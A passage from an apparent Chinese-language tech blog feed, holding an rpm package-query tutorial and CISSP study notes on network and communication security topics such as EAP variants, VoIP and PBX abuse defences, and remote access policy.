    <content type="html"><![CDATA[<span id="more"></span><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在基于 RPM（Red Hat Package Manager）的 Linux 发行版（如 Red Hat Enterprise Linux、CentOS、Fedora 等）中，你可以使用 <code>rpm</code> 命令来查询已安装的软件包</p><h2 id="语法命令"><a href="#语法命令" class="headerlink" title="语法命令"></a>语法命令</h2><h3 id="列出所有已安装的软件包"><a href="#列出所有已安装的软件包" class="headerlink" title="列出所有已安装的软件包"></a>列出所有已安装的软件包</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rpm -qa</span><br></code></pre></td></tr></table></figure><p>-q  查询模式</p><p>-a  列出所有已安装的软件包</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) [root@ ~]# rpm -qa<br>mlocate<span class="hljs-string">-0</span>.26<span class="hljs-string">-8</span>.el7.x86_64<br>kbd<span class="hljs-string">-1</span>.15.5<span class="hljs-string">-15</span>.el7.x86_64<br></code></pre></td></tr></table></figure><h3 id="模糊匹配安装的软件包"><a href="#模糊匹配安装的软件包" class="headerlink" title="模糊匹配安装的软件包"></a>模糊匹配安装的软件包</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> | <span class="hljs-keyword">grep</span> -i <span class="hljs-string">&#x27;yundun&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">(base) [root@ ~]# rpm -<span class="hljs-keyword">qa</span> | <span class="hljs-keyword">grep</span> -i <span class="hljs-string">&#x27;nmap&#x27;</span><br><span class="hljs-keyword">nmap</span>-ncat-<span class="hljs-number">6.40</span>-<span class="hljs-number">19</span>.el7.x86_64<br><span class="hljs-keyword">nmap</span>-<span class="hljs-number">7.94</span>-<span class="hljs-number">1</span>.x86_64<br></code></pre></td></tr></table></figure><p>grep -i 正则匹配</p><h3 id="查询某个软件包详细信息"><a href="#查询某个软件包详细信息" class="headerlink" title="查询某个软件包详细信息"></a>查询某个软件包详细信息</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rpm</span> -qi 软件包名<br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@ ~]<span class="hljs-comment"># rpm -qi nmap</span><br><span class="hljs-params">Name        :</span> nmap<br><span class="hljs-params">Epoch       :</span> <span class="hljs-number">2</span><br><span class="hljs-params">Version     :</span> <span class="hljs-number">7.94</span><br><span class="hljs-params">Release     :</span> <span class="hljs-number">1</span><br><span class="hljs-params">Architecture:</span> x86_64<br>Install <span class="hljs-params">Date:</span> Tue <span class="hljs-number">15</span> Aug <span class="hljs-number">2023</span> <span class="hljs-number">04</span>:<span class="hljs-number">53</span>:<span class="hljs-number">54</span> PM CST<br><span class="hljs-params">Group       :</span> Applications<span class="hljs-symbol">/System</span><br><span class="hljs-params">Size        :</span> <span class="hljs-number">30202253</span><br><span class="hljs-params">License     :</span> https:<span class="hljs-symbol">//nmap.org/man/man-legal.html</span><br><span class="hljs-params">Signature   :</span> (none)<br>Source <span class="hljs-params">RPM  :</span> nmap-<span class="hljs-number">7.9</span>4-<span class="hljs-number">1</span>.src.rpm<br>Build <span class="hljs-params">Date  :</span> Sat <span class="hljs-number">20</span> May <span class="hljs-number">2023</span> <span class="hljs-number">11</span>:<span class="hljs-number">46</span>:<span class="hljs-number">37</span> AM CST<br>Build <span class="hljs-params">Host  :</span> centos7<br><span class="hljs-params">Relocations :</span> (not relocatable)<br><span class="hljs-params">URL         :</span> https:<span class="hljs-symbol">//nmap.org</span><br><span class="hljs-params">Summary     :</span> Network exploration tool and security scanner<br>Description :<br></code></pre></td></tr></table></figure><p>Name：软件包名称</p><p>Version：软件包版本</p><p>Release：发行版本</p><p>Install Date：安装时间</p><p>Group：所属类别</p><p>Size：空间占用大小</p><p>License：许可证类型，Commercial-商业的</p><p>Signature：签名信息</p><p>Source RPM：RPM 包名称</p><h3 id="列出指定-RPM-包安装的所有文件"><a href="#列出指定-RPM-包安装的所有文件" class="headerlink" title="列出指定 RPM 包安装的所有文件"></a>列出指定 RPM 包安装的所有文件</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rpm</span> -ql 软件包名<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@ ~]<span class="hljs-comment"># rpm -ql nmap</span><br><span class="hljs-regexp">/usr/</span>bin/ndiff<br><span class="hljs-regexp">/usr/</span>bin/nmap<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3.6/</span>site-packages<span class="hljs-regexp">/__pycache__/</span>ndiff.cpython-<span class="hljs-number">36</span>.opt-<span class="hljs-number">1</span>.pyc<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3.6/</span>site-packages<span class="hljs-regexp">/__pycache__/</span>ndiff.cpython-<span class="hljs-number">36</span>.pyc<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3.6/</span>site-packages/ndiff.py<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>nmap-<span class="hljs-number">7.94</span><br></code></pre></td></tr></table></figure><h3 id="查询某个文件属于的-RPM-包"><a href="#查询某个文件属于的-RPM-包" class="headerlink" title="查询某个文件属于的 RPM 包"></a>查询某个文件属于的 RPM 包</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rpm</span> -qf 文件名<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">(<span class="hljs-keyword">base</span>) [root@ ~]<span class="hljs-meta"># rpm -qf /usr/bin/nmap</span><br>nmap<span class="hljs-number">-7.94</span><span class="hljs-number">-1.</span>x86_64<br></code></pre></td></tr></table></figure><h3 id="验证已安装的包"><a href="#验证已安装的包" class="headerlink" title="验证已安装的包"></a>验证已安装的包</h3><p>验证已安装包的文件是否有任何修改、删除或权限变更</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">rpm -V 软件包名<br><br>rpm <span class="hljs-comment">--verify 软件包名</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@ ~]<span class="hljs-comment"># rpm -V nginx-1.20.1-10.el7.x86_64</span><br>S.<span class="hljs-number">5</span>....T.  c <span class="hljs-regexp">/etc/</span>nginx/nginx.conf<br>You have mail <span class="hljs-keyword">in</span> <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root<br>(base) [root@ ~]<span class="hljs-comment"># rpm --verify nginx-1.20.1-10.el7.x86_64</span><br>S.<span class="hljs-number">5</span>....T.  c <span class="hljs-regexp">/etc/</span>nginx/nginx.conf<br>You have mail <span class="hljs-keyword">in</span> <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root<br></code></pre></td></tr></table></figure><p>如果有输出，则表示存在改动，常见结果说明</p><ul><li>S：size 文件大小不同</li><li>5：md5 MD5 校验和不匹配</li><li>T：time 修改时间不同</li><li>G：group 组不同</li><li>U：user 所有者不同</li><li>L：link 链接路径不同</li><li>M：文件权限或类型不同</li><li>D：设备号不同</li></ul>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12-域4通信与网络安全-通信与网络安全</title>
    <link href="/2025/03/09/security/seccert/cissp/12-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    <url>/2025/03/09/security/seccert/cissp/12-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="通信与网络安全要点"><a href="#通信与网络安全要点" class="headerlink" title="通信与网络安全要点"></a>通信与网络安全要点</h1><p>通信安全的作用在于检测、预防甚至纠正数据传输过程中的错误（提供完整性与保密性保护）。</p><p>通信安全的目的是在满足数据交换与数据共享的同时，保证网络的安全。</p><h1 id="12-1-协议安全机制"><a href="#12-1-协议安全机制" class="headerlink" title="12.1 协议安全机制"></a>12.1 协议安全机制</h1><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;互联网协议）是互联网及大多数网络中使用的主要协议族。</p><p>虽然是 TCP&#x2F;IP 的基础协议族，也有数百个甚至数千个单独的协议、机制及应用在互联网中广发使用。有些提供安全服务、有些保护完整性、有些保护保密性，有些提供安全身份认证及访问控制。</p><h3 id="12-1-1-身份认证协议"><a href="#12-1-1-身份认证协议" class="headerlink" title="12.1.1 身份认证协议"></a>12.1.1 身份认证协议</h3><p>点对点协议（Point-to-Point Protocol，PPP）是一种封装协议，旨在支持通过拨号或点对点链路传输 IP 流量。</p><p>数据链路层协议，允许支持串行链路的 WAN 设备的多供应商操作。</p><p>PPP 是许多现代通信的基础，也是通信认证的基础。</p><p>PPP 包括广泛的通信服务，如 IP 地址的分配和管理、同步通信的管理、标准化封装、多路复用、链路配置、链路质量测试、错误检测以及功能或选项协商（如压缩）。</p><p>PPP 取代了串行线路网间协议（SLIP）。</p><p>PPP 支持自动连接配置、错误检测、全双工通信和身份认证选项。</p><h4 id="PPP选项-PAP"><a href="#PPP选项-PAP" class="headerlink" title="PPP选项-PAP"></a>PPP选项-PAP</h4><p>PAP（Password  Authentication Protocol，密码身份认证协议）</p><p>使用明文传输用户名与密码</p><p>不提供任何形式的加密，只提供简单的传输途径，把登录证书从客户端传递到身份认证服务器。</p><h4 id="PPP选项-CHAP"><a href="#PPP选项-CHAP" class="headerlink" title="PPP选项-CHAP"></a>PPP选项-CHAP</h4><p>CHAP（Challenge Handshake Authentication Protocol，征询握手身份认证协议）</p><p>采用无法重发的挑战-应答对话进行验证。</p><p>挑战是服务器发出的随机数，客户端使用该随机数和密码哈希来计算单向函数产生的响应。</p><p>在已经建立的完整通信会话期间，CHAP 周期性重复验证远程系统，以确保远程用户身份持续有效。</p><p>CHAP 基于 MD5 ，已不再安全。</p><h4 id="PPP选项-EAP"><a href="#PPP选项-EAP" class="headerlink" title="PPP选项-EAP"></a>PPP选项-EAP</h4><p>EAP（Extensible Authentication Protocol，可扩展身份认证协议）</p><p>一种身份认证框架，而不是真实协议。</p><p>EAP 支持可定制的身份认证安全解决方案，如智能卡、令牌和生物身份认证。</p><p>一些 EAP 方案使用加密，但另一些不使用加密。</p><h5 id="LEAP"><a href="#LEAP" class="headerlink" title="LEAP"></a>LEAP</h5><p>LEAP（Lightweight Extensible Authentication Protocol，轻量级可扩展身份认证协议）</p><p>Cisco 专有 WPA TKIP 替代方案。</p><p>旨在解决  TKIP 中的缺陷。</p><p><strong>由于 WPA2 的发展，LEAP 现已过时，需要避免使用 LEAP</strong> 。</p><h5 id="EAP-FAST"><a href="#EAP-FAST" class="headerlink" title="EAP-FAST"></a>EAP-FAST</h5><p>EAP-FAST（EAP Flexible  Authentication via Secure Tunneling，EAP 通过安全隧道进行灵活的身份认证）</p><p>一种 Cisco 协议</p><p>旨在取代 LEAP</p><h5 id="PEAP"><a href="#PEAP" class="headerlink" title="PEAP"></a>PEAP</h5><p>PEAP（Protected Extensible  Authentication Protocol，受保护的可扩展身份认证协议）</p><p>TLS 隧道中封装 EAP 协议。</p><p>PEAP 优于 EAP，因为 PEAP 自身实现了安全性。</p><p>PEAP 支持交叉验证。</p><h5 id="EAP-SIM"><a href="#EAP-SIM" class="headerlink" title="EAP-SIM"></a>EAP-SIM</h5><p>EAP-SIM （EAP Subscriber Identity Module，EAP 用户识别模块）</p><p>通过全球移动通信系统（GSM）网络认证移动设备的一种手段。</p><p>向每个用户&#x2F;设备发放一张身份识别模块（SIM）卡，该卡与用户的账户和服务级别相关。</p><h5 id="EAP-MD5"><a href="#EAP-MD5" class="headerlink" title="EAP-MD5"></a>EAP-MD5</h5><p>使用 MD5 哈希密码的最早 EAP 方法之一，<strong>现已被弃用</strong>。</p><h5 id="EAP-POTP"><a href="#EAP-POTP" class="headerlink" title="EAP-POTP"></a>EAP-POTP</h5><p>EAP-POTP（EAP Protected One-Time Password，EAP保护的一次性密码）</p><p>支持在多因素身份认证中使用 OTP 令牌（包括硬件设备和软件解决方案）</p><p>用于单向和交叉身份认证</p><h5 id="EAP-TLS"><a href="#EAP-TLS" class="headerlink" title="EAP-TLS"></a>EAP-TLS</h5><p>EAP-TLS（EAP Transport Layer Security，EAP 传输层安全）</p><p>一个开放的 IEIF 标准</p><p>用于保护身份认证流量的 TLS 协议的实现。</p><h5 id="EAP-TTLS"><a href="#EAP-TTLS" class="headerlink" title="EAP-TTLS"></a>EAP-TTLS</h5><p>EAP-TTLS（EAP Tunneled Transport Layer Security，EAP隧道传输层安全）</p><p>EAP-TLS 的扩展，在身份认证进行之前在端点之间创建类似于 VPN 的隧道，确保即使是客户端的用户们，也不会以明文传输。</p><p>IEEE 802.1X 定义了封装 EAP 的使用，以支持 LAN  连接的广泛身份认证选项。</p><p>802.1X 标准被命名为 “基于端口的网络访问控制”，端口指的是任何网络链路。</p><p>802.1X 是企业无线身份认证的基础，802.1X 将无线客户端身份认证请求转发到专用远程身份认证服务器或 AAA 服务器（通常为 RADIUS 或 TACACS+），以此方式充当身份认证代理。</p><p>802.1X 不是一种无线技术（即 IEEE 802.11），是一种认证技术，可以在需要认证的任何地方使用，包括 WAP、防火墙、路由器、交换机、代理、VPN 网关和远程访问服务器（RAS）&#x2F;网络访问服务器（NAS）。</p><p>802.1X 容易受到中间人（MITM）攻击（也称为路径攻击）和劫持攻击，因为身份认证机制仅在建立连接时发生。并非所有 802.1X 或 EAP 认证方法都是安全的。</p><p>​解决方案：1、使用 802.1X&#x2F;EAP 提供的身份认证保护；2、使用定期的会话期间重新身份认证；3、实施会话加密</p><h2 id="12-1-2-端口安全"><a href="#12-1-2-端口安全" class="headerlink" title="12.1.2 端口安全"></a>12.1.2 端口安全</h2><h3 id="端口安全含义"><a href="#端口安全含义" class="headerlink" title="端口安全含义"></a>端口安全含义</h3><p>1、表示对所有连接点的物理控制</p><p>限制未经授权的用户或设备连接到开放端口。</p><p>使用智能配线架。</p><p>2、管理 TCP 和 UDP 端口</p><p>防火墙、IDS、IPS 和其他安全工具可以检测到端口扫描，并阻止或发回虚假&#x2F;误导性信息，降低端口扫描的效率。</p><h3 id="端口安全措施"><a href="#端口安全措施" class="headerlink" title="端口安全措施"></a>端口安全措施</h3><p>在交换机、路由器、智能配线架甚至无线网络上实施端口身份认证，也就是 IEEE 802.1X。</p><h2 id="12-1-3-服务质量"><a href="#12-1-3-服务质量" class="headerlink" title="12.1.3 服务质量"></a>12.1.3 服务质量</h2><p>维护和保护可用性</p><p>服务质量（QoS）是对网络通信效率和性能的监督和管理。</p><p>要测量的项目包括吞吐量、比特率、数据包丢失、延迟、抖动、传输延迟和可用性。</p><p>高优先级或时间敏感流量（如 VoIP）可以按优先级排列，其他流量可以根据需要进行抑制。</p><p>节流或整形可以在协议或 IP 基础上实现，以设置最大使用或消耗限制。</p><h1 id="12-2-语音通信的安全"><a href="#12-2-语音通信的安全" class="headerlink" title="12.2 语音通信的安全"></a>12.2 语音通信的安全</h1><p>电讯包括公共交换电话网（PSTN）（又名普通老式电话服务，或POTS）、专用交换机（PBX）、移动&#x2F;蜂窝服务和 VoIP。</p><h2 id="12-2-1-公共交换电话网"><a href="#12-2-1-公共交换电话网" class="headerlink" title="12.2.1 公共交换电话网"></a>12.2.1 公共交换电话网</h2><p>PBX 和 PSTN 语音通信容易受到拦截、窃听、tapping 及其他破解技术的攻击。</p><p>安全措施：</p><p>1、组织的物理范围内，通过物理安全来保护语音通信的安全。</p><p>2、组织场所外部，语音通信的安全主要由提供通信线路租用服务的公司来负责。</p><p>如果语音通信重要，应该部署并使用加密通信机制。</p><h2 id="12-2-2-VoIP"><a href="#12-2-2-VoIP" class="headerlink" title="12.2.2 VoIP"></a>12.2.2 VoIP</h2><p>VoIP（Voice over Internet Protocol，网络电话）是一种将语音封装在 IP 包中的技术。</p><p>支持在 TCP&#x2F;IP 网络中打电话。</p><p>VoIP可以使用安全实时传输协议（SRTP）来提供加密。</p><p>VoIP 不是一种单一的技术，尽管使用通用的标准化协议。</p><p>VoIP 除非位于同一 VoIP 提供商的网络内，否则无法确保连接受到端对端加密的保护。</p><p><strong>VoIP 存在的攻击风险</strong></p><p>中间人&#x2F;路径攻击</p><p>劫持</p><p>域欺骗</p><p>拒绝服务（DOS）</p><p>语音钓鱼</p><p>电话飞客</p><p>欺骗</p><p>滥用</p><p><strong>VoIP 通信的保护措施</strong></p><ul><li>使用强密码和双因素身份认证</li><li>记录通话记录并检查是否有异常活动</li><li>阻止国际电话</li><li>将 VoIP 外包给受信任的 SaaS</li><li>更新 VoIP 设备固件</li><li>限制对 VoIP 相关网络设备的物理访问</li><li>使用 VoIP 安全最佳实践培训用户</li><li>阻止不存在或无效的原始号码，防止 IP电话上的幽灵呼叫</li><li>部署带有 VoIP 评估功能的 NIPS</li></ul><h2 id="12-2-3-语音钓鱼和电话飞客"><a href="#12-2-3-语音钓鱼和电话飞客" class="headerlink" title="12.2.3 语音钓鱼和电话飞客"></a>12.2.3 语音钓鱼和电话飞客</h2><p>vishing 基于语音的网络钓鱼</p><p>语音钓鱼的防御方针，以教育用户如何应对任何形式的交流</p><ul><li><p>要一直对任何看起来奇怪的、来历不明的或意外的语音通信倍加小心</p></li><li><p>在继续进行涉及敏感、个人、财务或机密信息的通话之前，要一直进行身份认证</p></li><li><p>对于所有单一语音请求的网络变更行为，要进行“回叫”授权。</p><p>回叫授权过程：</p><p>首先断开来电者的通话</p><p>然后使用来电者的预设号码回叫该用户（该号码通常存储在公司目录中）以验证用户身份</p></li><li><p>对信息（用户名、密码、IP地址、经理姓名、拨入号码等）进行分级，并清楚地标识出可通过语音通信讨论或确认的信息</p></li><li><p>如果有人通过电话索要特权信息，而且此人应该知道此种行为是违法公司安全策略的，那么，可以询问此人请求信息的原因，并再次验证身份，将此种活动报告给安全管理员</p></li><li><p>严禁通过单一语音通信交出或更改密码</p></li><li><p>阻止与语音钓鱼关联的号码</p></li><li><p>不要假设显示的来电 ID  是有效的。应该利用来电 ID 标示不想和谁说话，而不是确认谁在打电话。</p></li></ul><p>电话飞客（phreaker）的恶意攻击滥用电话系统的方式与攻击者滥用计算机的方式大致相同（“ph”代表“电话”）。</p><p>电话飞客攻击通常是针对电话系统和语音服务的一种特定类型的攻击。</p><p>利用各种技术绕过电话系统，拨打免费长途电话，改变电话服务功能，窃取专用服务，甚至造成服务中断。</p><p>飞客可以攻击 移动设备、PBX 系统和 VoIP 解决方案。</p><h2 id="12-2-4-PBX-欺骗与滥用"><a href="#12-2-4-PBX-欺骗与滥用" class="headerlink" title="12.2.4 PBX 欺骗与滥用"></a>12.2.4 PBX 欺骗与滥用</h2><p>专用交换机（private branch exchange，PBX）欺骗与滥用。</p><p>专用交换机是一种部署在私人组织中的电话交换系统，用于支持多台电话使用少量外部 PSTN 线路。</p><p>远程呼叫，也被称为 hoteling，是指在办公室之外呼入办公室 PBX 系统，输入密码后可以拨打另一个电话号码的能力。</p><p>PBX 系统受到恶意攻击的目的是逃避电话费用或隐藏身份。</p><p>电话飞客可能会非法访问个人的语音信箱，重定向消息，阻塞访问以及重定向呼入与呼出电话。</p><p>应对 PBX 欺骗和滥用的措施：逻辑或技术控制、管理控制以及物理控制</p><ul><li><p>考虑用信任卡或呼叫卡系统来替代通过 PBX 进行的远程访问或长距离呼叫。</p></li><li><p>只向工作中需要该类业务的合法用户提供拨入及拨出的功能。</p></li><li><p>如果仍然使用拨入调制解调器，应使用未公布的电话号码，号码的前缀区号要与现在使用的不同。</p></li><li><p>保护 PBX 的管理员接口。</p></li><li><p>阻止或停用任何未分配的访问码或账户。</p></li><li><p>制订切实可行的用户策略，并教用户如何正确使用系统。</p></li><li><p>记录并审计 PBX 上的所有活动，并通过审计踪迹发现安全及使用上的违规行为。</p></li><li><p>禁用维护调制解调器（即厂商用于远程管理、更新、调试产品的远程访问调制解调器）和&#x2F;或任何形式的远程管理访问。</p></li><li><p>更改默认配置，尤其是密码及有关管理或特权特点的功能。</p></li><li><p>阻止远程呼叫。</p></li><li><p>使用供应商&#x2F;服务提供商更新来保持系统的更新。</p></li><li><p>采用 DISA（direct inward system access，直接拨入系统访问）技术，减少外部实体对 PBX 的欺骗。</p><p>DISA 将身份认证要求添加到 PBX 的所有外部连接，务必在 DISA 的基础上禁用组织不需要的所有功能，创建复杂且难以猜测的用户代码&#x2F;密码，然后启用审计以监控 PBX 活动</p></li></ul><h1 id="12-3-远程访问安全管理"><a href="#12-3-远程访问安全管理" class="headerlink" title="12.3 远程访问安全管理"></a>12.3 远程访问安全管理</h1><p>远程客户与网络建立起通信会话的能力，常见形式：</p><ul><li>在互联网上通过 VPN 接入网络。使用完整客户机。</li><li>连接到 WAP （本地环境将视其为远程访问）。使用完整客户机。</li><li>通过瘦客户端连接接入终端服务器系统、大型机、虚拟私有云（VPC）端点、虚拟桌面接口或虚拟移动接口。使用完整客户机。</li><li>使用远程桌面服务，如 Microsoft 的 Remote Desktop、TeamViewer、GoToMyPC、LogMeIn、Citrix Workspace 或 VNC，接入位于办公区的个人计算机。</li><li>基于云的桌面解决方案，如 Amazon Workspace、Amazon AppStream、V2 Cloud 和 Microsoft Azure。</li><li>使用调制解调器直接拨入远程访问服务器。</li></ul><h2 id="12-3-1-远程访问与远程办公技术"><a href="#12-3-1-远程访问与远程办公技术" class="headerlink" title="12.3.1 远程访问与远程办公技术"></a>12.3.1 远程访问与远程办公技术</h2><p>远程访问技术类型：</p><p><strong>特定服务</strong>  特定服务类型的远程访问，为用户提供远程接入和使用单一服务（如邮件）的功能。</p><p><strong>远程控制</strong> 远程控制类型的远程访问使远程用户能够完全控制物理上相距遥远的系统。显示器与键盘就像直接连接在远程系统上一样。</p><p><strong>远程节点操作</strong> 远程节点操作只是远程客户端与 LAN 建立直接连接时的另一个名称，例如使用无线、VPN 或拨号连接。</p><p>远程系统连接到一个远程访问服务器，而该服务器为远程客户端提供网络服务及可能的互联网连接。</p><p><strong>抓屏&#x2F;录屏</strong>  </p><p>应用场合一：</p><p>用于远程控制、远程访问或远程桌面服务。也就是虚拟应用或虚拟桌面，抓取目标机器的屏幕并显示给远程操作者。</p><p>由于远程访问资源会在传输过程中带来额外的泄漏或破坏风险，<strong>必须使用加密的抓屏方案。</strong></p><p>应用场合二：</p><p>允许自动化工具与人机界面进行交互。</p><h2 id="12-3-2-远程连接安全"><a href="#12-3-2-远程连接安全" class="headerlink" title="12.3.2 远程连接安全"></a>12.3.2 远程连接安全</h2><h3 id="远程连接的安全风险"><a href="#远程连接的安全风险" class="headerlink" title="远程连接的安全风险"></a>远程连接的安全风险</h3><ul><li>任何具备远程连接的人员，如果企图破坏组织的安全，物理安全的防护效果会降低。</li><li>远程办公人员可能使用不安全或低安全的远程系统来访问敏感数据，存在数据丢失、破坏和泄漏风险。</li><li>远程系统可能遭受恶意代码攻击，可能成为恶意代码传入专用网络的载体。</li><li>远程系统可能在物理上不够安全，存在被非法实体滥用或偷窃的风险。</li><li>远程系统可能难以进行故障定位，尤其是出现有关远程连接的问题时。</li><li>远程系统可能难以升级或打补丁，原因在于其较少的连接或较慢的连接速度。</li></ul><h3 id="远程连接的安全策略"><a href="#远程连接的安全策略" class="headerlink" title="远程连接的安全策略"></a>远程连接的安全策略</h3><ul><li><p>远程用户应该经过严格的身份认证才能获得访问权限。</p></li><li><p>只有那些工作中需要远程访问的特定用户，才有权限建立远程连接。</p></li><li><p>所有远程通信都要防止被拦截和窃听。</p><p>需要加密技术来保护身份认证信息与数据传输。</p></li></ul><h2 id="12-3-3-规划远程访问安全策略"><a href="#12-3-3-规划远程访问安全策略" class="headerlink" title="12.3.3 规划远程访问安全策略"></a>12.3.3 规划远程访问安全策略</h2><h3 id="远程访问安全策略需要解决的问题"><a href="#远程访问安全策略需要解决的问题" class="headerlink" title="远程访问安全策略需要解决的问题"></a>远程访问安全策略需要解决的问题</h3><p><strong>远程连接技术</strong>  </p><p>每种连接都有其独特的安全问题。</p><p>要对所选连接的各个方面进行全面的检查。</p><p><strong>传输保护</strong></p><p>根据远程连接的需要选择合适的安全服务组合。</p><p>可供选择的服务包括 VPN&#x2F;TLS</p><p><strong>身份认证保护</strong></p><p>保护数据流量的基础上，还需要保护所有登录凭证的安全。</p><p>需要采用安全身份认证协议以及必要的中心化远程访问身份认证系统和多因素验证。</p><p><strong>远程用户助手</strong></p><p>远程访问用户存在需要技术协助的需求，必须要尽可能提供有效获取协助的方法。</p><h1 id="12-4-多媒体协作"><a href="#12-4-多媒体协作" class="headerlink" title="12.4 多媒体协作"></a>12.4 多媒体协作</h1><p>验证连接是否已被加密</p><p>是否使用可靠的多因素身份认证</p><p>是否可以审计查看追踪</p><h2 id="12-4-1-远程会议"><a href="#12-4-1-远程会议" class="headerlink" title="12.4.1 远程会议"></a>12.4.1 远程会议</h2><h3 id="远程会议需要注意的安全问题"><a href="#远程会议需要注意的安全问题" class="headerlink" title="远程会议需要注意的安全问题"></a>远程会议需要注意的安全问题</h3><ul><li><p>服务是否使用了强身份认证技术？</p></li><li><p>通信是否采用了开放协议或加密通道？</p></li><li><p>加密是从端点到中心服务器，还是端到端？</p></li><li><p>是否允许真正删除会议内容？</p></li><li><p>是否对用户活动进行审计与日志记录？</p></li><li><p>未经授权的实体能否参加私人会议？</p></li><li><p>与会者能否通过语音、图像、视频或文件共享插入会议？</p></li><li><p>平台是否将广告&#x2F;垃圾邮件集成到界面中，是否可以禁用？</p></li><li><p>使用了什么跟踪机制？可以禁用跟踪吗？收集的数据是用于什么的？</p></li><li><p>会议被记录下来了吗？谁有权接触这些记录？它们可以被导出和分发吗？</p></li></ul><h2 id="12-4-2-即时通信和聊天"><a href="#12-4-2-即时通信和聊天" class="headerlink" title="12.4.2 即时通信和聊天"></a>12.4.2 即时通信和聊天</h2><p>IM（instant messaging，即时通信，实时消息或聊天）是一种实时通信工具，能为互联网上任何地方的两个或更多用户提供基于文字的聊天功能。</p><p>端对端和基于云形式的IM：易于部署和使用，但是难以管理，缺乏安全性或管理控制。</p><p>可能存在安全风险：</p><ul><li>数据包容易被嗅探&#x2F;窃听</li><li>缺乏本地安全功能（如多因素身份认证和加密）</li><li>缺乏隐私保护</li></ul><p>解决方案：</p><p>多因素认证+传输加密</p><h1 id="12-5-负载均衡"><a href="#12-5-负载均衡" class="headerlink" title="12.5 负载均衡"></a>12.5 负载均衡</h1><p><strong>负载均衡的目的</strong></p><p>更优化的基础设施利用率</p><p>最小化响应时间</p><p>最大化吞吐量</p><p>减少过载</p><p>消除瓶颈</p><p><strong>常见实现方法</strong></p><p>负载分散到多个服务器，通过多种调度技术执行负载分配。</p><p><img src="/./../12-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20250313213627743.png" alt="image-20250313213627743"></p><p>负载均衡可以是软件服务或硬件设备。</p><p><strong>负载均衡其他的功能</strong></p><p>缓存</p><p>TLS 卸载，即证书卸载</p><p>压缩</p><p>缓冲</p><p>错误检查</p><p>过滤</p><p>防火墙</p><p>IDS</p><h2 id="12-5-1-虚拟IP和负载持久性"><a href="#12-5-1-虚拟IP和负载持久性" class="headerlink" title="12.5.1 虚拟IP和负载持久性"></a>12.5.1 虚拟IP和负载持久性</h2><p><strong>虚拟IP</strong>，也就是 VIP ，用于负载均衡，客户端可以感知 IP 